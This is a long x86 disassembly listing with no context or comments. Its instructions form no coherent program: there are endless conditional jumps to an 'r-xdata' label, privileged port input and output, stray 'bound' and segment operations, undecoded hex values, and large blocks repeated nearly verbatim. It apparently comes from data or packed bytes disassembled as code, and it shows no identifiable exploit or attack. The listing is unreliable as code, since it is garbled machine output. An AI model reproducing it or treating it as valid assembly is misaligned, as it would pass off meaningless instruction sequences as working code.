add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
outsb
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
sbb [ esp + edx ] edx
pop es
inc edi
out dx eax
jmp r-xdata
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46e5af
lea esp [ edx - 0x6a ]
add [ ecx + 0x628db483 ] eax
xchg esi eax
pop es
or [ esp + esi * 4 + 0x596628d ] 0x14337502
adc al 0x7b
jpo r-xdata
cmp esp [ edx - 0x4a ]
pop ss
jpo r-xdata
add dl al
hlt
mov dh 0x17
jpo r-xdata
jpo r-xdata
jmp r-xdata
add [ esi + 0x37ae628d ] 0x29b81b3
jne r-xdata
in al 0x6f
in al 0xeb
jmp r-xdata
bound esi [ esi - 0x72cf273d ]
bound esi [ esi - 0x35b2fd3f ]
jmp r-xdata
adc al 0x14
jpo r-xdata
adc al 0x68
lea esp [ edx - 0x4a ]
int 0x60
xor ecx [ ebp - 0x273c499e ]
xor [ ebp + 0x2c1b662 ] cl
dec ebp
0xebeb
adc al 0x9e
out 0x14 eax
jpo r-xdata
jpo r-xdata
iretd
jmp r-xdata
adc al 0xb2
add cl [ esi ]
jmp r-xdata
cmp al 0x1b
jpo r-xdata
adc al 0x14
mov dl 0x2
or al 0xe6
sbb [ ebx + 0x141c7502 ] 0x7b7b7b14
add edi [ ebx + ebx ]
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
xor esp 0xffffffeb
in al 0xeb
jpo r-xdata
mov dl 0x6e
sub esp esp
outsb
out 0x3 al
adc al 0x14
scasb [ edi ]
cmp edi [ ebx + 0x3e3ae60 ]
ja r-xdata
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
outsb
jmp r-xdata
cmp [ esi ] 0xffffffa4
sub [ ebx + 0x7b ] bh
jpo r-xdata
xor ebp ebx
jpo r-xdata
outsb
sub esp esp
outsb
out 0xeb al
jmp r-xdata
add edi [ esi + 0x2ebebc1 ]
into
in al 0x6f
add eax edx
jmp r-xdata
jmp r-xdata
mov esp 0xcc9803bb
jmp r-xdata
scasw [ edi ]
iretd
lahf
iretd
jpo r-xdata
mov dh 0xe7
in al 0x6f
xor al 0xc2
jmp r-xdata
sub eax [ edx ]
into
xor [ esp + edx ] dl
jpo r-xdata
mov ch 0x6e
jmp r-xdata
or [ esi + 0xbbe628d ] 0xbe628db1
or eax ebx
cmp [ ecx + 0x36110285 ] eax
or [ esp + edx ] edx
jpo r-xdata
pop esp
jpo r-xdata
adc al 0xb8
jpo r-xdata
jmp r-xdata
pop eax
fld [ eax + 0x2a ]
jmp 0xffffffffec3f4f56
in al 0x5c
jpo r-xdata
add al [ ebp + 0xa ]
adc al 0x14
jpo r-xdata
jpo r-xdata
mov eax 0x140a4502
adc al 0x7b
jpo r-xdata
in al 0x6e
add bl [ eax - 0x10 ]
adc al 0x14
jpo r-xdata
mov ebx 0xbcebebe9
sbb [ eax + 0x608a81b2 ] 0xae628d2a
xor esi [ ebx + 0x3b608681 ]
lea esp [ edx - 0x42 ]
xor [ ecx + 0x628d9b81 ] esi
mov esi 0x8781b137
lea esp [ edx - 0x42 ]
xor eax 0x8d8e81b1
bound edi [ esi + 0x628db10b ]
mov esi 0x8139d809
test [ edx ] eax
adc [ esi ] esi
add bl [ ebp + edi + 0x14 ]
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
out 0xfe al
jpo r-xdata
pop esi
jpo r-xdata
push 0x9
adc al 0x14
sbb ah ah
outsb
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
shr [ edx ] 0x2
adc al 0x14
jpo r-xdata
jpo r-xdata
sbb edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
fcomp [ 0xffffffffa7bc14bd ]
add dl [ ecx - 0x4cebebe5 ]
add ebp 0xebf39402
jmp r-xdata
adc al 0xbc
mov ebx 0x2822b5b4
sub ebp ecx
or ah bh
jpo r-xdata
outsd
retn
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xb8
jpo r-xdata
and dl [ edi ]
adc al 0x14
jpo r-xdata
mov eax 0xeb6b7c14
jmp r-xdata
jpo r-xdata
jmp [ eax - 0x52 ]
jpo r-xdata
xchg ebx eax
add ch [ eax - 0x3d ]
jpo r-xdata
outsb
jpo r-xdata
leave
in al 0x6f
sub ch cl
add ah [ esi - 0x8 ]
sbb [ edx ] 0xfffffff6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jl r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
retn
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
test [ edx + 0x2f5d14ab ] 0xeb
jmp r-xdata
adc al 0xbc
out 0x60 eax
xor ebp [ eax + 0x10 ]
adc al 0xe4
jpo r-xdata
bound ebp [ esi - 0x61eb44e9 ]
jpo r-xdata
push 0x6ee4ebd3
mov esi 0xcca10337
jmp r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esi 0xebfee602
jmp r-xdata
jpo r-xdata
jpo r-xdata
lea ebp [ eax - 0x2d ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
push 0x7bebebc3
adc al 0xc0
jpo r-xdata
adc al 0x9e
bound esp [ esi + 0x38810287 ]
adc al 0x14
jpo r-xdata
sub al [ edx ]
jpo r-xdata
sub esp [ esi + 0x6e ]
push edi
adc [ esp + edx ] edx
in al 0x6f
mov ecx fs
jmp r-xdata
or al 0x14
jpo r-xdata
clc
jmp r-xdata
hlt
push es
jpo r-xdata
0xebeb
scasb [ edi ]
pop ss
mov ebx 0x60ff9e14
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc [ ebx - 0x140bf9fe ] 0xd27b7beb
jpo r-xdata
mov eax 0x82f61a83
stosd [ edi ]
adc al 0x5d
das
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp r-xdata
loope r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
mov esi 0x140b3602
adc al 0x83
out dx eax
0x6f66ebeb 0x7fcf
add bh [ edi + 0x7b141416 ]
jpo r-xdata
outsb
leave
fucomi st3
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sti
adc al 0x9e
out 0x14 eax
sahf
add al [ esi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov ah 0xb5
in al 0x6e
jpo r-xdata
jpo r-xdata
mov [ 0x2141410 ] al
sbb [ ecx ] ebx
adc al 0x14
jmp r-xdata
jpo r-xdata
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
sbb dh dh
jpo r-xdata
sub ebx 0xffffffdb
jmp sub_46ebbc
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov esp 0xeb83ef81
jpo r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ecx
into
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add dh [ edi ]
push 0x6fe41413
cmp edx 0xec02ebeb
push ss
jmp r-xdata
jpo r-xdata
rcl [ eax - 0x5d911b29 ] cl
adc [ esp + edx ] dl
add bl [ ecx ]
jpo r-xdata
bound edi [ esi + 0x6702b151 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsb
outsd
stc
jmp r-xdata
mov esp 0x683360e7
adc [ esp ] dl
fucomi st3
jmp r-xdata
bound esi [ esi + 0x37ae6017 ]
jpo r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
out dx eax
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
or edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sub ch cl
mov esp 0x52021160
add al [ esi + 0x39 ]
bound esp [ esi - 0x7edc9fe5 ]
lds ecx [ ebp - 0x4de6599e ]
lea esp [ edx - 0x5a ]
jpo r-xdata
sbb eax [ edx ]
aaa
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
adc al 0xb2
bound ebp [ esi - 0x1bd72fe9 ]
outsd
sub eax [ edx ]
lodsd [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
push ecx
mov cl 0x2
loopne r-xdata
scasb [ edi ]
mov bh 0xbb
add al [ eax + 0x8 ]
adc al 0x14
jpo r-xdata
shr [ ebp - 0x4911b21 ] 0x1
jmp r-xdata
pop ss
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
jpo r-xdata
sub ebx 0xdc03ebeb
jmp r-xdata
add eax [ ebp + 0x3 ]
adc al 0x14
jpo r-xdata
nop
[ edx - 0x1b185930 ]
jpo r-xdata
mov dl 0x62
scasb [ edi ]
pop ss
shr [ eax ] 0x1
in al 0x6f
inc ebp
add edx [ esp + edx ]
jpo r-xdata
jmp r-xdata
pushad
scasb [ edi ]
aaa
mov dh 0x17
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x9e
aaa
adc al 0x7c
and eax [ ecx - 0x599d723b ]
sbb [ edx + 0x1fa6628d ] esi
outsb
das
pop ss
adc al 0x14
add bh [ eax ]
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
shl [ esi + 0x7d69e4e7 ] 0x1
cli
jmp r-xdata
jpo r-xdata
iretd
push 0x60bce92a
adc [ edx ] eax
push edx
dec edi
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
jpo r-xdata
add ah dh
outsb
cmp esp esp
outsb
call 0xffffffffe932d4f0
sahf
jpo r-xdata
outsb
pop es
push ss
adc al 0x14
add esp [ eax ]
retn
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
loopne r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
clc
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
xlat
in al 0x6e
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
add cl [ ebx ]
jpo r-xdata
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
outsb
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
sbb [ esp + edx ] edx
pop es
inc edi
out dx eax
jmp r-xdata
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46e72b
leave
mov esp 0x141bbf02
adc al 0x7b
jpo r-xdata
sub ebx 0xebfdea02
jpo r-xdata
or [ esi + 0xbbe628d ] 0xbe628db1
or eax ebx
cmp [ ecx + 0x36110285 ] eax
add ch dl
std
sub ecx 0x60e7bd14
xor ebp [ eax + 0x10 ]
adc al 0x2
in eax dx
loopne r-xdata
or [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
pop esp
jpo r-xdata
adc al 0xb8
jpo r-xdata
cmp ecx [ ebp - 0x4ece419e ]
jpo r-xdata
out 0x81 eax
jpo r-xdata
shl [ esi + 0x346fe4e7 ] cl
retn 0xebeb
jmp r-xdata
pop eax
fld [ eax + 0x2a ]
jmp 0xffffffffec3f4f56
in al 0x5c
jpo r-xdata
add al [ ebp + 0xa ]
adc al 0x14
jpo r-xdata
mov eax 0x140a4502
adc al 0x7b
jpo r-xdata
jpo r-xdata
bound edi [ esi - 0x647e4ecf ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
in al 0x6e
add bl [ eax - 0x10 ]
adc al 0x14
jpo r-xdata
mov ebx 0xbcebebe9
sbb [ eax + 0x608a81b2 ] 0xae628d2a
xor esi [ ebx + 0x3b608681 ]
lea esp [ edx - 0x42 ]
add bl [ ebp + edi + 0x14 ]
jpo r-xdata
inc ebp
or dl [ esp + edx ]
adc al 0x7b
jpo r-xdata
mov esp 0x143d5c02
xor [ ecx + 0x628d9b81 ] esi
mov esi 0x8781b137
lea esp [ edx - 0x42 ]
xor eax 0x8d8e81b1
bound edi [ esi + 0x628db10b ]
mov esi 0x8139d809
test [ edx ] eax
adc [ esi ] esi
jpo r-xdata
in al 0x6e
aaa
xor [ esp + edx ] edx
add bl [ edx ]
shr ebx 0xeb
mov ebp 0xebe90d02
jmp r-xdata
jmp 0x612ea451
jpo r-xdata
sbb [ ebx + 0x37be628d ] 0x8d8781b1
bound edi [ esi - 0x717e4ecb ]
lea esp [ edx - 0x42 ]
or esi [ ecx + 0x9be628d ]
fdivr [ ecx ]
add [ ebp + 0x14361102 ] 0x7b7b7b14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
aaa
mov cl 0x81
xchg [ ebp - 0x4eca419e ] ecx
adc al 0x9f
mov dh 0xe7
in al 0x6f
xor al 0xc2
jmp r-xdata
mov ch 0x6e
sub eax [ edx ]
into
xor [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
xor ebp ebx
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
add eax edx
jmp r-xdata
jmp r-xdata
mov esp 0xcc9803bb
jmp r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
iretd
lahf
out 0xfe al
jpo r-xdata
pop esi
jpo r-xdata
push 0x9
adc al 0x14
sbb ah ah
outsb
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
shr [ edx ] 0x2
adc al 0x14
jpo r-xdata
jpo r-xdata
sbb edx [ esp + edx ]
jpo r-xdata
adc al 0xbb
fcomp [ 0xffffffffa7bc14bd ]
add dl [ ecx - 0x4cebebe5 ]
add ebp 0xebf39402
jmp r-xdata
adc al 0xbc
mov ebx 0x2822b5b4
sub ebp ecx
or ah bh
jpo r-xdata
outsd
retn
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xb8
jpo r-xdata
and dl [ edi ]
adc al 0x14
jpo r-xdata
mov eax 0xeb6b7c14
jmp r-xdata
jpo r-xdata
jmp [ eax - 0x52 ]
jpo r-xdata
xchg ebx eax
add ch [ eax - 0x3d ]
jpo r-xdata
outsb
jpo r-xdata
leave
in al 0x6f
sub ch cl
add ah [ esi - 0x8 ]
sbb [ edx ] 0xfffffff6
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jl r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
retn
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
test [ edx + 0x2f5d14ab ] 0xeb
jmp r-xdata
adc al 0xbc
out 0x60 eax
xor ebp [ eax + 0x10 ]
adc al 0xe4
jpo r-xdata
bound ebp [ esi - 0x61eb44e9 ]
jpo r-xdata
push 0x6ee4ebd3
mov esi 0xcca10337
jmp r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
mov esi 0xebfee602
jmp r-xdata
jpo r-xdata
jpo r-xdata
lea ebp [ eax - 0x2d ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
push 0x7bebebc3
adc al 0xc0
jpo r-xdata
adc al 0x9e
bound esp [ esi + 0x38810287 ]
adc al 0x14
jpo r-xdata
sub al [ edx ]
jpo r-xdata
sub esp [ esi + 0x6e ]
push edi
adc [ esp + edx ] edx
in al 0x6f
mov ecx fs
jmp r-xdata
or al 0x14
jpo r-xdata
clc
jmp r-xdata
hlt
push es
jpo r-xdata
0xebeb
scasb [ edi ]
pop ss
mov ebx 0x60ff9e14
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc [ ebx - 0x140bf9fe ] 0xd27b7beb
jpo r-xdata
mov eax 0x82f61a83
stosd [ edi ]
adc al 0x5d
das
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jmp r-xdata
loope r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
mov esi 0x140b3602
adc al 0x83
out dx eax
0x6f66ebeb 0x7fcf
add bh [ edi + 0x7b141416 ]
jpo r-xdata
outsb
leave
fucomi st3
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sti
adc al 0x9e
out 0x14 eax
sahf
add al [ esi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
scasb [ edi ]
jpo r-xdata
mov ah 0xb5
in al 0x6e
jpo r-xdata
jpo r-xdata
mov [ 0x2141410 ] al
sbb [ ecx ] ebx
adc al 0x14
jmp r-xdata
jpo r-xdata
sub [ ebx - 0x14d0a2ec ] 0xeb
jmp r-xdata
sbb dh dh
jpo r-xdata
sub ebx 0xffffffdb
jmp sub_46ebbc
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
mov esp 0xeb83ef81
jpo r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6f
pop ecx
into
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add dh [ edi ]
push 0x6fe41413
cmp edx 0xec02ebeb
push ss
jmp r-xdata
jpo r-xdata
rcl [ eax - 0x5d911b29 ] cl
